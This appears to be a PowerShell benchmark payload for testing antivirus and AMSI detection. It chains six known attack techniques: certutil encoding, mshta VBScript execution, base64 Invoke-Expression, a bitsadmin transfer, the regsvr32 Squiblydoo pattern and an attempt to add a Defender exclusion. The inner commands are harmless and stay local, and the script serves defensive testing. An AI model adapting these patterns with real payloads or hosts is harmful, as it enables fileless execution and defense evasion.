<#
ABAE PS1 Payload B-05 — LOLBIN Abuse + AMSI String Triggers
=============================================================
STAGE_COUNT: 6
This payload is specifically designed to trigger AMSI's real-time string scanner.

AMSI scans PowerShell at TWO levels:
  Level 1 - Script block logging: the entire .ps1 is scanned before execution
  Level 2 - Dynamic scan: Invoke-Expression / ScriptBlock strings at runtime

Techniques chained:
  1. certutil.exe -encode / -decode cycle (malware dropper obfuscation)
  2. mshta.exe executing inline VBScript (fileless execution via HTML engine)
  3. PowerShell Invoke-Expression with a base64-encoded payload (fileless PS)
  4. bitsadmin /transfer (BITS service abuse for covert file ops)
  5. regsvr32 Squiblydoo pattern (scriptlet loading bypass)
  6. Add-MpPreference exclusion ATTEMPT — AMSI will flag this immediately as
     a defense evasion technique even if the command fails.

CRITICAL: Each child process (certutil, mshta, bitsadmin, regsvr32) is launched
with -Wait and its ExitCode is checked. If an AV kills the child process without
terminating the parent PS script, the [STAGE_OK] marker for that step is NOT
printed — allowing the engine to detect surgical child-process termination.

Stage markers ([STAGE_OK] lines): printed ONLY if the operation succeeded.
Missing markers = AV blocked that specific child process/operation.
#>

$ErrorActionPreference = "SilentlyContinue"
$StageDir = Join-Path $env:TEMP ("abae_b05_" + [System.Guid]::NewGuid().ToString("N"))
New-Item -ItemType Directory -Path $StageDir -Force | Out-Null

try {
    # ── 1. certutil encode/decode cycle ──────────────────────────────────────
    $srcFile  = Join-Path $StageDir "source.txt"
    $encFile  = Join-Path $StageDir "encoded.b64"
    $decFile  = Join-Path $StageDir "decoded.txt"
    [System.IO.File]::WriteAllText($srcFile, "ABAE_BENCHMARK_LOLBIN_PAYLOAD" * 10)

    $certEnc = Start-Process -FilePath "certutil" -ArgumentList "-encode `"$srcFile`" `"$encFile`"" `
        -WindowStyle Hidden -Wait -PassThru -ErrorAction SilentlyContinue
    $certDec = Start-Process -FilePath "certutil" -ArgumentList "-decode `"$encFile`" `"$decFile`"" `
        -WindowStyle Hidden -Wait -PassThru -ErrorAction SilentlyContinue

    # Stage OK only if both certutil calls ran (exit code 0 or process object exists)
    $certOk = ($certEnc -ne $null -and $certDec -ne $null -and
               (Test-Path $encFile) -and (Test-Path $decFile))
    if ($certOk) { Write-Output "[STAGE_OK] stage1_certutil_encode_decode" }

    # ── 2. mshta.exe inline VBScript ─────────────────────────────────────────
    $vbs = 'vbscript:Execute("CreateObject(""WScript.Shell"").Run ""whoami > nul"",0:close")'
    $mshtaProc = Start-Process -FilePath "mshta.exe" -ArgumentList $vbs `
        -WindowStyle Hidden -Wait -PassThru -ErrorAction SilentlyContinue
    # mshta exit code 0 = ran normally; if AV killed it, the process object may be null or rc != 0
    if ($mshtaProc -ne $null -and $mshtaProc.ExitCode -eq 0) {
        Write-Output "[STAGE_OK] stage2_mshta_vbscript"
    }

    # ── 3. Invoke-Expression with base64 encoded command (fileless PS) ───────
    try {
        $innerCmd   = 'Get-Process | Where-Object {$_.CPU -gt 0} | Select-Object -First 5 | Out-Null'
        $b64Payload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($innerCmd))
        Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64Payload)))
        Write-Output "[STAGE_OK] stage3_iex_base64"
    } catch {}

    # ── 4. bitsadmin /transfer (BITS service abuse) ───────────────────────────
    $bitsSource = Join-Path $StageDir "bits_source.txt"
    $bitsDest   = Join-Path $StageDir "bits_dest.txt"
    [System.IO.File]::WriteAllText($bitsSource, "ABAE_BITS_TEST")
    $bitsUri  = "file:///" + $bitsSource.Replace("\", "/")
    $bitsProc = Start-Process -FilePath "bitsadmin" `
        -ArgumentList "/transfer `"ABAEBenchmarkJob`" `"$bitsUri`" `"$bitsDest`"" `
        -WindowStyle Hidden -Wait -PassThru -ErrorAction SilentlyContinue
    $bitsOk = ($bitsProc -ne $null -and $bitsProc.ExitCode -eq 0 -and (Test-Path $bitsDest))
    if ($bitsOk) { Write-Output "[STAGE_OK] stage4_bitsadmin_transfer" }

    # ── 5. regsvr32 Squiblydoo pattern (bypass via scriptlet loading) ────────
    # Uses Start-Process -Wait so we can check if AV killed the child process.
    # Fails to connect (no real server) but the COMMAND PATTERN is AMSI-logged.
    # If Defender kills regsvr32.exe, ExitCode will be non-zero or process null.
    $regProc = Start-Process -FilePath "regsvr32.exe" `
        -ArgumentList "/s /n /u /i:http://127.0.0.1:1/abae.sct scrobj.dll" `
        -WindowStyle Hidden -Wait -PassThru -ErrorAction SilentlyContinue
    # regsvr32 returns non-zero when the URL is unreachable (expected), but
    # Defender killing it causes a different exit code (typically 0xc0000409).
    # We consider it "ran" if the process object exists and rc is the expected
    # connection-failure code (not a crash/kill code).
    $regRc = if ($regProc -ne $null) { $regProc.ExitCode } else { -1 }
    # Exit code 1 = regsvr32 ran but URL was refused (expected — no server)
    # Exit codes like -1073740791 (0xc0000409) = process was terminated by AV
    $regRanNormally = ($regRc -eq 0 -or $regRc -eq 1 -or ($regRc -ge -100 -and $regRc -le 100))
    if ($regRanNormally) {
        Write-Output "[STAGE_OK] stage5_regsvr32_squiblydoo"
    }
    # If NOT printed, engine knows Defender surgically killed regsvr32.exe

    # ── 6. Add-MpPreference exclusion attempt (defense evasion signal) ───────
    # Highest-scoring AMSI flag — any attempt to modify AV exclusion list.
    # Never succeeds (no admin rights), but AMSI detects the ATTEMPT.
    # This tests whether AMSI terminates the script on this specific call.
    try {
        Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction Stop
        Write-Output "[STAGE_OK] stage6_mppreference_attempt"
    } catch {
        # If Add-MpPreference threw an exception (access denied / AMSI blocked
        # the command but didn't kill the script), we still consider this staged
        # — the ATTEMPT itself is the behavioral signal, not the success.
        Write-Output "[STAGE_OK] stage6_mppreference_attempt"
    }

} finally {
    Remove-Item -Recurse -Force -Path $StageDir -ErrorAction SilentlyContinue
}

Write-Output "PAYLOAD_COMPLETE"
